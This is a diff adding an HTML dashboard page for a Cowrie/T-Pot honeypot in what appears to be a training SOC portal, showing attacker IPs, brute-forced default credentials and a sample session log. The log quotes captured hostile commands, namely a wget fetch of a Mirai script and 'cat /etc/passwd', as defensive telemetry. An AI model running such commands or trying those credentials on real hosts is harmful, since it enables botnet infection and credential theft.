@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Honeypot — DBI SOC</title>
+  <script>
+    // Applied before CSS/paint so there's no flash of the wrong theme.
+    (function () {
+      try {
+        var saved = localStorage.getItem('soc_theme');
+        if (saved === 'light') document.documentElement.setAttribute('data-theme', 'light');
+      } catch (e) {}
+    })();
+  </script>
+  <link rel="stylesheet" href="soc-theme.css">
+</head>
+<body>
+<div class="layout">
+
+  <nav class="sidebar">
+    <div class="sidebar-brand">
+      <a href="index.html" class="brand-icon" style="text-decoration:none;font-size:15px;">🛡️</a>
+      <div class="brand-text"><span class="brand-title">DBI SOC</span><span class="brand-sub">COMMAND CENTER</span></div>
+    </div>
+    <div class="sidebar-section">
+      <div class="sidebar-section-label">Dashboards</div>
+      <div class="sidebar-group-label">Command & Analytics</div>
+      <ul class="sidebar-nav">
+        <li class="nav-item"><a href="01_soc_overview.html"><span class="nav-icon">📊</span><span>SOC Overview</span></a></li>
+        <li class="nav-item"><a href="05_ai_agents.html"><span class="nav-icon">🤖</span><span>AI Agents</span></a></li>
+        <li class="nav-item"><a href="02_opensearch_siem.html"><span class="nav-icon">🔍</span><span>OpenSearch SIEM</span></a></li>
+      </ul>
+      <div class="sidebar-group-label">Network Security</div>
+      <ul class="sidebar-nav">
+        <li class="nav-item"><a href="15_pfsense_firewall.html"><span class="nav-icon">🔥</span><span>pfSense Firewall</span></a></li>
+        <li class="nav-item"><a href="04_suricata_ids.html"><span class="nav-icon">🚨</span><span>Suricata IDS</span></a></li>
+        <li class="nav-item"><a href="03_zeek_network.html"><span class="nav-icon">🌐</span><span>Zeek Network</span></a></li>
+        <li class="nav-item"><a href="26_arkime_pcap.html"><span class="nav-icon">🦑</span><span>Arkime PCAP</span></a></li>
+        <li class="nav-item"><a href="28_crowdsec_ips.html"><span class="nav-icon">🚧</span><span>CrowdSec IPS</span></a></li>
+        <li class="nav-item"><a href="29_pihole_dns.html"><span class="nav-icon">🕳️</span><span>Pi-hole DNS</span></a></li>
+      </ul>
+      <div class="sidebar-group-label">Endpoint Security</div>
+      <ul class="sidebar-nav">
+        <li class="nav-item"><a href="13_wazuh_edr.html"><span class="nav-icon">🐺</span><span>Wazuh EDR</span></a></li>
+        <li class="nav-item"><a href="11_file_integrity.html"><span class="nav-icon">🗂️</span><span>File Integrity</span></a></li>
+      </ul>
+      <div class="sidebar-group-label">Vulnerability & Hardening</div>
+      <ul class="sidebar-nav">
+        <li class="nav-item"><a href="12_openvas_vapt.html"><span class="nav-icon">🛡️</span><span>OpenVAS VAPT</span></a></li>
+        <li class="nav-item"><a href="16_lynis_hardening.html"><span class="nav-icon">🧱</span><span>Lynis Hardening</span></a></li>
+        <li class="nav-item"><a href="30_harbor_registry.html"><span class="nav-icon">📦</span><span>Harbor Registry</span></a></li>
+      </ul>
+      <div class="sidebar-group-label">Threat Intel & Deception</div>
+      <ul class="sidebar-nav">
+        <li class="nav-item"><a href="08_misp_ti.html"><span class="nav-icon">🌍</span><span>MISP Intel</span></a></li>
+        <li class="nav-item"><a href="14_honeypot.html" class="active"><span class="nav-icon">🍯</span><span>Honeypot</span></a></li>
+      </ul>
+      <div class="sidebar-group-label">DFIR & Case Management</div>
+      <ul class="sidebar-nav">
+        <li class="nav-item"><a href="06_iris_cases.html"><span class="nav-icon">📋</span><span>DFIR-IRIS</span></a></li>
+        <li class="nav-item"><a href="09_velociraptor.html"><span class="nav-icon">🦖</span><span>Velociraptor</span></a></li>
+        <li class="nav-item"><a href="23_thehive_cortex.html"><span class="nav-icon">🩹</span><span>TheHive + Cortex</span></a></li>
+      </ul>
+      <div class="sidebar-group-label">Access & Secrets</div>
+      <ul class="sidebar-nav">
+        <li class="nav-item"><a href="21_keycloak_sso.html"><span class="nav-icon">🔐</span><span>Keycloak SSO</span></a></li>
+        <li class="nav-item"><a href="22_vault_secrets.html"><span class="nav-icon">🗝️</span><span>Vault Secrets</span></a></li>
+      </ul>
+      <div class="sidebar-group-label">Automation</div>
+      <ul class="sidebar-nav">
+        <li class="nav-item"><a href="24_n8n_automation.html"><span class="nav-icon">🧩</span><span>n8n Automation</span></a></li>
+      </ul>
+      <div class="sidebar-group-label">Analyst Tools</div>
+      <ul class="sidebar-nav">
+        <li class="nav-item"><a href="25_cyberchef.html"><span class="nav-icon">🧪</span><span>CyberChef</span></a></li>
+      </ul>
+      <div class="sidebar-group-label">Asset & Ops</div>
+      <ul class="sidebar-nav">
+        <li class="nav-item"><a href="27_netbox_cmdb.html"><span class="nav-icon">🗄️</span><span>NetBox CMDB</span></a></li>
+      </ul>
+      <div class="sidebar-group-label">Observability</div>
+      <ul class="sidebar-nav">
+        <li class="nav-item"><a href="17_grafana_metrics.html"><span class="nav-icon">📈</span><span>Grafana Metrics</span></a></li>
+      </ul>
+      <div class="sidebar-divider"></div>
+      <ul class="sidebar-nav">
+        <li class="nav-item danger"><a href="redteam-hub.html"><span class="nav-icon">🔴</span><span>Red Team Module</span></a></li>
+      </ul>
+    </div>
+    <div class="sidebar-footer">MITRE ATT&amp;CK v14</div>
+  </nav>
+
+  <header class="topbar">
+    <div class="topbar-title"><span class="page-icon">🍯</span> Honeypot — Cowrie / T-Pot</div>
+    <span class="topbar-meta"><span class="status-dot green"></span> 4 honeypot services active</span>
+    <div class="topbar-right">
+      <a href="http://localhost:64297" target="_blank" class="btn btn-ghost btn-sm">Open T-Pot ↗</a>
+      <a href="index.html" class="btn btn-ghost btn-sm">← Portal</a>
+    </div>
+  </header>
+
+  <main class="main-content">
+
+    <div class="grid-4 mb-4">
+      <div class="kpi-card info">
+        <div class="kpi-label">Active Honeypots</div>
+        <div class="kpi-value">4</div>
+        <div class="kpi-sub">Cowrie SSH/Telnet, Dionaea, Honeytrap</div>
+      </div>
+      <div class="kpi-card critical">
+        <div class="kpi-label">Sessions Today</div>
+        <div class="kpi-value">217</div>
+        <div class="kpi-sub">↑ 34% vs yesterday</div>
+      </div>
+      <div class="kpi-card high">
+        <div class="kpi-label">Unique Attacker IPs</div>
+        <div class="kpi-value">58</div>
+        <div class="kpi-sub">across 19 countries</div>
+      </div>
+      <div class="kpi-card medium">
+        <div class="kpi-label">Top Credential Tried</div>
+        <div class="kpi-value" style="font-size:16px;margin-top:4px">root / 123456</div>
+        <div class="kpi-sub">41 attempts</div>
+      </div>
+    </div>
+
+    <div class="grid-2 mb-4">
+      <div class="card">
+        <div class="card-header"><span class="card-title">🌐 Top Attacker Source IPs</span></div>
+        <div class="card-body" style="padding:0;overflow-x:auto">
+          <table class="data-table">
+            <thead><tr><th>IP</th><th>Country</th><th>Sessions</th><th>Honeypot</th></tr></thead>
+            <tbody>
+              <tr><td class="mono">185.220.101.45</td><td>🇷🇺 RU</td><td>47</td><td>Cowrie-SSH</td></tr>
+              <tr><td class="mono">45.142.212.61</td><td>🇳🇱 NL</td><td>33</td><td>Cowrie-Telnet</td></tr>
+              <tr><td class="mono">193.32.162.9</td><td>🇩🇪 DE</td><td>22</td><td>Dionaea</td></tr>
+              <tr><td class="mono">89.248.165.74</td><td>🇷🇴 RO</td><td>19</td><td>Cowrie-SSH</td></tr>
+              <tr><td class="mono">103.219.112.4</td><td>🇮🇳 IN</td><td>14</td><td>Honeytrap</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-header"><span class="card-title">🔑 Top Credential Pairs Tried</span></div>
+        <div class="card-body" style="padding-top:var(--space-3)">
+          <div style="font-size:11px;color:var(--text-secondary);margin-bottom:6px">root / 123456 <span style="float:right">41</span></div>
+          <div class="progress-bar"><div class="progress-fill critical" style="width:85%"></div></div>
+          <div style="font-size:11px;color:var(--text-secondary);margin:10px 0 6px">admin / admin <span style="float:right">29</span></div>
+          <div class="progress-bar"><div class="progress-fill high" style="width:60%"></div></div>
+          <div style="font-size:11px;color:var(--text-secondary);margin:10px 0 6px">root / password <span style="float:right">22</span></div>
+          <div class="progress-bar"><div class="progress-fill medium" style="width:46%"></div></div>
+          <div style="font-size:11px;color:var(--text-secondary);margin:10px 0 6px">ubuntu / ubuntu <span style="float:right">14</span></div>
+          <div class="progress-bar"><div class="progress-fill low" style="width:29%"></div></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="card mb-4">
+      <div class="card-header">
+        <span class="card-title">📜 Live Session Log</span>
+        <span class="badge badge-accent">LIVE</span>
+      </div>
+      <div class="card-body" style="padding:0;overflow-x:auto">
+        <table class="data-table">
+          <thead><tr><th>Time</th><th>Honeypot</th><th>Source IP</th><th>Activity</th><th>MITRE</th></tr></thead>
+          <tbody>
+            <tr class="row-suspicious">
+              <td class="mono">13:52:10</td><td>Cowrie-SSH</td><td class="mono">185.220.101.45</td>
+              <td>Login success (root/123456) → ran <span class="mono">wget http://45.x.x.x/mirai.sh</span></td><td><span class="badge badge-neutral">T1059.004</span></td>
+            </tr>
+            <tr>
+              <td class="mono">13:47:33</td><td>Cowrie-Telnet</td><td class="mono">45.142.212.61</td>
+              <td>23 login attempts, all failed (dictionary brute force)</td><td><span class="badge badge-neutral">T1110</span></td>
+            </tr>
+            <tr>
+              <td class="mono">13:40:02</td><td>Dionaea</td><td class="mono">193.32.162.9</td>
+              <td>SMB connection — probed for MS17-010 (EternalBlue)</td><td><span class="badge badge-neutral">T1210</span></td>
+            </tr>
+            <tr>
+              <td class="mono">13:31:18</td><td>Honeytrap</td><td class="mono">103.219.112.4</td>
+              <td>Port scan across 40 ports in 6 seconds</td><td><span class="badge badge-neutral">T1046</span></td>
+            </tr>
+            <tr class="row-suspicious">
+              <td class="mono">13:20:55</td><td>Cowrie-SSH</td><td class="mono">89.248.165.74</td>
+              <td>Login success (admin/admin) → attempted <span class="mono">cat /etc/passwd</span></td><td><span class="badge badge-neutral">T1552</span></td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <div class="card mb-4">
+      <div class="card-body" style="font-size:12px;color:var(--text-muted)">
+        Honeypots are isolated on the <span class="mono">red-team</span> internal network with no route to production
+        or lab hosts — they exist purely to attract and log opportunistic internet scanning/credential-stuffing traffic
+        for early-warning training. Captured payloads are forwarded to MISP as IOCs and to OpenSearch for correlation.
+      </div>
+    </div>
+
+  </main>
+</div>
+</body>
+</html>
